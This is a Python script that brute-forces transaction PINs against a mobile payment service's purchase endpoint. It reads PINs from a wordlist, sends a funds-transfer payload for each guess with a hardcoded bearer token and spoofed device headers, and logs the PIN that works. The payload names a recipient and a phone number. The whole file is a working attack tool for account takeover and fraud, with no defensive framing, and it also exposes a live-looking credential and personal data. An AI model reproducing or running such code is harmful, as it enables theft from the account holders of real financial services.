import requests
import json
import multiprocessing as mp

bearer = "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiIyMjUiLCJqdGkiOiI2MzUyOGQxMmJhNDk2MzYwMTNhZjNmNDEzOGMxN2JlYzMzMGM1MDc2NjgxZGQzMzg5ZGYwNDQxZmY0MzkwMzMxYTlkNzQwMTAzNDdmZTU1YiIsImlhdCI6MTY5MTMxMTkzMS42NjE0NDksIm5iZiI6MTY5MTMxMTkzMS42NjE0NTIsImV4cCI6MTY5MTkxNjcyOC4zOTMzOTIsInN1YiI6IjU1MTQiLCJzY29wZXMiOltdfQ.dWhSsXOZPZ3Qhlc8bWCTkhAAqeXU-YVAursT439_apfmfLzIqc8lXtcJH50ykrBiu8-RjK8aqtCEFZV1Gulr83moq1h29q6ObRUGb7O2zbf34VyOl2rcbvn1ogR9rDbOK5ktl9Se3QG8zNi2ntbIOmtaOGexmLcNCtbTC39GvbzW3sycGFZraq4oKYsG9_krPp71yRYN7ZMh1y61neMw_fzatW4Tjr3VEGVPDPj3q7OlBLKuIVjj3mUGD8QsXZaYFNyCHz4e_CXcPzPFljUi-zJtGV2dJNFzlXQsYrQ5CQxJfo-IeitUHtiLiXjsiQoexfu7oigv0_SNRycmt19JFrcNS83y5QHb59j5bPXqQr3VbQykAA-Z7VexIUPANHknQZrZvIUMsqy7GX28cKHXZuRZkozhVEKEkI75WXaNjq4bO2ZNhy5y5ySM_3inNZw1Na2JzQv65_jRtvgmwvQufjUXz8QOhr8A32bt7OGSJOluHKF213yQkTEM4igdKXZ6TpbyBv-1mSZHoKYa9b5Ik9Fcl2dhNvmSdmn0aKRbcOfNKwcm_jNa-cnlRzJ_Dno9ngoOZ8bIAdG9vkadVJ10_FpUnoK6OGlGwOYhC88ZqhjBtJfOpDLIi2cdKCbamaaQgmvKmwg6hqBe0MP-deRxDpdN30VJJ28sw3Zo4-0fdcs"
def mainProg(m,n,p):

    headers = {"Content-Type": "application/json", "Versioncode": "2022", "Appversion": "1.3.6","Devicename": "android", "Devicetype": "Mobile", "Location": "7.4343,-2.6454", "Authorization": bearer, "Serialnumber": "64871fac9dabaadc", "Deviceserial": "64871fac9dabaadc","Deviceid": "64871fac9dabaadc","Devicemodel": "Infinix", "Accept-Encoding": "gzip, deflate","User-Agent": "okhttp/5.0.0-alpha.2"}

    with open("comb.txt", "r") as handle:
        lines = handle.readlines()
    i = 1
    for line in lines[m:n]:
        print(f"PROCESS==> {p}\n")
        print(f"{i}==> Trying: {line} \n")
        otp = line.strip()
        otp = int(otp)
        payload = json.dumps({"address":"","amount":"10700.0","billersCode":"9600673230","billersname":"MEHTIC(GABRIEL OLADIMEJI)","categoryid":"6","description":"","model":"","narration":"","phone":"08063503450","pin":otp,"platform":"","sender":"","serviceid":"commercialbank3","uuid":"","variationid":"101","tranx":"16911269302115576930890284368","versioncode":"2022"})

        url = f'https://mobile.kippapay.com/api/purchasevas'
        """
        x = requests.post(url, headers = mheaders, data = payload)
        respx = x.text
        print(respx)
        resp =json.loads(respx)
        token = resp['access_token']
        #print(url)
        """
        try:
            response = requests.post(url, headers = headers, data = payload)
            xs = response.status_code
            x = response.text
            x1 = json.loads(response.text) #x[29:55]
            x2 = x1['title']
            print(x)
            print(x2)
            print(xs)
            #except:
                #x = "naan"
                #x1 = "nonee"

            #exit()
            if x2 != 'Incorrect' and xs == 200:
                print(f"PROCESS==> {p}\n")
                print(x)
                print("\n PIN Found!")
                print(line)
                print(url)
                with open("pinfound.txt", "a") as handle:
                    lisnes = handle.write(f"{line} - {x} \n")
            
            elif x2 == 'Incorrect':
                print("Incorrect OTP!")
            
                
            else:
                print(x)
                print(line)
                with open("pinerror.txt", "a") as handle:
                    lisnes = handle.write(line)
            i += 1

        except:
            pass

if __name__ == '__main__':
    filee = "pins.txt" #input("Enter file name: ")
    count1 = 10000/10
    
    p1 = mp.Process(target=mainProg, args=(0, int(count1), 1))
    
    #p2 = mp.Process(target=mainProg, args=(int(count1), int(count1*2), 2))
    """
    p3 = mp.Process(target=mainProg, args=(int(count1*2), int(count1*3), 3))
    p4 = mp.Process(target=mainProg, args=(int(count1*3), int(count1*4), 4))
    p5 = mp.Process(target=mainProg, args=(int(count1*4), int(count1*5), 5))
    p6 = mp.Process(target=mainProg, args=(int(count1*5), int(count1*6), 6))
    p7 = mp.Process(target=mainProg, args=(int(count1*6), int(count1*7), 7))
    p8 = mp.Process(target=mainProg, args=(int(count1*7), int(count1*8), 8))
    p9 = mp.Process(target=mainProg, args=(int(count1*8), int(count1*9), 9))
    p10 = mp.Process(target=mainProg, args=(int(count1*9), int(count1*10), 10))
    
    p11 = mp.Process(target=mainProg, args=(int(count1*10), int(count1*11), 11))
    p12 = mp.Process(target=mainProg, args=(int(count1*11), int(count1*12), 12))
    p13 = mp.Process(target=mainProg, args=(int(count1*12), int(count1*13), 13))
    p14 = mp.Process(target=mainProg, args=(int(count1*13), int(count1*14), 14))
    p15 = mp.Process(target=mainProg, args=(int(count1*14), int(count1*15), 15))
    p16 = mp.Process(target=mainProg, args=(int(count1*15), int(count1*16), 16))
    p17 = mp.Process(target=mainProg, args=(int(count1*16), int(count1*17), 17))
    p18 = mp.Process(target=mainProg, args=(int(count1*17), int(count1*18), 18))
    p19 = mp.Process(target=mainProg, args=(int(count1*18), int(count1*19), 19))
    p20 = mp.Process(target=mainProg, args=(int(count1*19), int(count1*20), 20))
    p21 = mp.Process(target=mainProg, args=(int(count1*20), int(count1*21), 21))
    p22 = mp.Process(target=mainProg, args=(int(count1*21), int(count1*22), 22))
    p23 = mp.Process(target=mainProg, args=(int(count1*22), int(count1*23), 23))
    p24 = mp.Process(target=mainProg, args=(int(count1*23), int(count1*24), 24))
    p25 = mp.Process(target=mainProg, args=(int(count1*24), int(count1*25), 25))
    p26 = mp.Process(target=mainProg, args=(int(count1*25), int(count1*26), 26))
    p27 = mp.Process(target=mainProg, args=(int(count1*26), int(count1*27), 27))
    p28 = mp.Process(target=mainProg, args=(int(count1*27), int(count1*28), 28))
    p29 = mp.Process(target=mainProg, args=(int(count1*28), int(count1*29), 29))
    p30 = mp.Process(target=mainProg, args=(int(count1*29), int(count1*30), 30))
    """
    p1.start()
    
    #p2.start()
    """
    p3.start()
    p4.start()
    p5.start()
    p6.start()
    p7.start()
    p8.start()
    p9.start()
    p10.start()
    
    p11.start()
    p12.start()
    p13.start()
    p14.start()
    p15.start()
    p16.start()
    p17.start()
    p18.start()
    p19.start()
    p20.start()
    p21.start()
    p22.start()
    p23.start()
    p24.start()
    p25.start()
    p26.start()
    p27.start()
    p28.start()
    p29.start()
    p30.start()
    """